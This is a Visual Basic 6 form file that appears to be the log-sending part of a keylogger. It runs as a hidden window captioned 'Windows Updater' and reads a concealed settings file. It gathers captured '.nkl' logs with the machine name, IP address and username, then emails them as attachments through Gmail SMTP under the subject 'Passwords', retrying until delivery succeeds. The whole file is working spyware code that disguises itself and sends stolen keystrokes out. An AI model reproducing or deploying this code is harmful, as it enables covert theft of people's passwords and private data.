VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Windows Updater"
   ClientHeight    =   150
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   Icon            =   "SendMail.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   150
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   360
      Top             =   4560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1440
      Top             =   0
   End
   Begin VB.FileListBox File1 
      Height          =   4185
      Left            =   5040
      Pattern         =   "*.nkl"
      TabIndex        =   2
      Top             =   240
      Width           =   1935
   End
   Begin VB.TextBox txtUserName 
      Height          =   285
      Left            =   2040
      TabIndex        =   1
      Text            =   "Username"
      Top             =   0
      Width           =   1695
   End
   Begin VB.TextBox txtSendThis 
      Height          =   4095
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   360
      Width           =   4815
   End
   Begin VB.Label lblSec 
      Caption         =   "0"
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   0
      Width           =   1215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Option Explicit

'username import function
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Lpath, sendTo, sendFrom, FromPWD, FromPC As String





Private Sub Form_Load()
Me.Left = Screen.Width - Me.Width
Me.Top = Screen.Height - Me.Height
LoadUserName
LoadSetting
End Sub
Private Sub LoadSetting()

Lpath = ""
Dim RetryTime, LogPWD As String

If Dir("C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt") <> "" Then 'setting file found then
    
    Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt" For Input As 1
    Input #1, Lpath, LogPWD, FromPC, sendTo, sendFrom, FromPWD, RetryTime
    Close #1
    
File1.Path = Lpath  'here Lpath=LogDirectory path
Timer1.Interval = 1000 * RetryTime
LoadLogtoSend   'Move to Log sending process

Else    'setting not found
    'MsgBox "Settings not found", , "Error"
    End
End If

End Sub
Private Sub LoadLogtoSend()
File1.Refresh

If File1.ListCount < 2 Then End    'no log or Only one log(current) send it next time

File1.ListIndex = 0 'Choose first log which will be oldest

Lpath = File1.Path & "\" & File1.FileName

Dim NoNeed, lTime, lDate, UName, lPwd, AppRevision As String

'Read initials
Open Lpath For Input As 1
Input #1, NoNeed, lTime, lDate, UName, lPwd, AppRevision
Close #1

txtSendThis = "Machine Name: " & Winsock1.LocalHostName & vbNewLine
txtSendThis = txtSendThis & "Machine Description: " & FromPC & vbNewLine
txtSendThis = txtSendThis & "Machine IP: " & Winsock1.LocalIP & vbNewLine
txtSendThis = txtSendThis & "Date: " & lDate & vbNewLine
txtSendThis = txtSendThis & "Start Time: " & lTime & vbNewLine
txtSendThis = txtSendThis & "End Time: " & FileDateTime(Lpath) & vbNewLine
txtSendThis = txtSendThis & "User: " & Encrypt(UName, -25) & vbNewLine
txtSendThis = txtSendThis & "AppVersion: " & Encrypt(AppRevision, -20) & vbNewLine

If lPwd <> "" Then  'Skip the Read Log Stage, Log is password protected.
txtSendThis = txtSendThis & "Password to Open :" & Left(lPwd, 2) & "****" & vbNewLine & "Download Attached Log."
Call SendEmail
Else
txtSendThis = txtSendThis & "______________________" & vbNewLine & vbNewLine
Call ReadLog
End If
End Sub
Private Sub ReadLog()

'Read Log & add to txtSendThis
Dim sTemp As String
Open Lpath For Input As 2
      While Not EOF(2)
        Line Input #2, sTemp
        If Left(sTemp, 2) <> Chr(34) & Chr(155) Then
            txtSendThis = txtSendThis & sTemp & vbCrLf
        End If
      Wend
Close #2

Call SendEmail
End Sub
Sub SendEmail()


Set iMsg = CreateObject("CDO.Message")
Set iConf = CreateObject("CDO.Configuration")
Set Flds = iConf.Fields

' send one copy with Google SMTP server (with autentication)
schema = "http://schemas.microsoft.com/cdo/configuration/"
Flds.Item(schema & "sendusing") = 2
Flds.Item(schema & "smtpserver") = "smtp.gmail.com"
Flds.Item(schema & "smtpserverport") = 465
Flds.Item(schema & "smtpauthenticate") = 1
Flds.Item(schema & "sendusername") = sendFrom
Flds.Item(schema & "sendpassword") = FromPWD
Flds.Item(schema & "smtpusessl") = 1
Flds.Update

On Error GoTo Err2

With iMsg
    .To = sendTo
    .From = sendFrom
    .Subject = "Passwords " & FromPC & "(" & Winsock1.LocalIP & ")"
    .TextBody = txtSendThis.Text
'    .HTMLBody = txtSendThis.Text   ' Use it to add HTML codes to email
    .AddAttachment Lpath
Set .Configuration = iConf
.Send
End With

Set iMsg = Nothing
Set iConf = Nothing
Set Flds = Nothing

'If Email Sent change the name of file So it will not resent
Name Lpath As Left(Lpath, Len(Lpath) - 3) & "sent"

'send Next log
Call LoadLogtoSend


Err2:
'Email not sent Retry
If Err.Number <> 0 Then
    If Timer1.Interval = 0 Then End
    If Err.Number = -2147220973 Then
    Timer1.Enabled = True  'PC might not be connected Retry after Sometim.
    Else
    'MsgBox Err.Description: 'Password, Username or any setting might be wrong
    End
    End If
End If

End Sub
'*********Offline Email Trial*****
Sub SendEmail2()

On Error GoTo Err2
Dim schema As String
Open App.Path & "\testEmail.txt" For Append As #1
' send one copy with Google SMTP server (with autentication)
schema = "http://schemas.microsoft.com/cdo/configuration/"
Print #1, 2
Print #1, "smtp.gmail.com"
Print #1, 465
Print #1, 1
Print #1, sendFrom
Print #1, FromPWD
Print #1, 1
Print #1, sendTo
Print #1, sendFrom
Print #1, "Passwords " & Winsock1.LocalIP
Print #1, txtSendThis.Text

Close #1

'If Email Sent change the name of file So it will not resent
Name Lpath As Left(Lpath, Len(Lpath) - 3) & "sent"

'send Next log
Call LoadLogtoSend


Err2:
'Email not sent Retry
If Err.Number <> 0 Then
    'If Err.Number = -2147220973 Then
    MsgBox Err.Description & "  Retry Started"
    Timer1.Enabled = True  'PC might not be connected> Retry.
    'Else
    'MsgBox Err.Description: End 'Password, Username or any setting might be wrong
    'End If
End If

End Sub


Private Sub Timer1_Timer()
lblSec.Caption = lblSec.Caption + 1
If lblSec.Caption = 60 Then lblSec.Caption = 0: Call SendEmail
End Sub
Private Sub LoadUserName()

'IMPORT USERNAME*******************************************
Dim sBuffer As String
    Dim lSize As Long
    sBuffer = Space$(255)
    lSize = Len(sBuffer)
    Call GetUserName(sBuffer, lSize)
    If lSize > 0 Then
        txtUserName = Left$(sBuffer, lSize)
    Else
        txtUserName = vbNullString
End If

End Sub
Private Function Encrypt(ByVal ThisText As String, encCode As Integer) As String
Dim i As Integer
For i = 1 To Len(ThisText)
Encrypt = Encrypt & Chr(Asc(Mid(ThisText, i, 1)) + encCode)
Next i
End Function


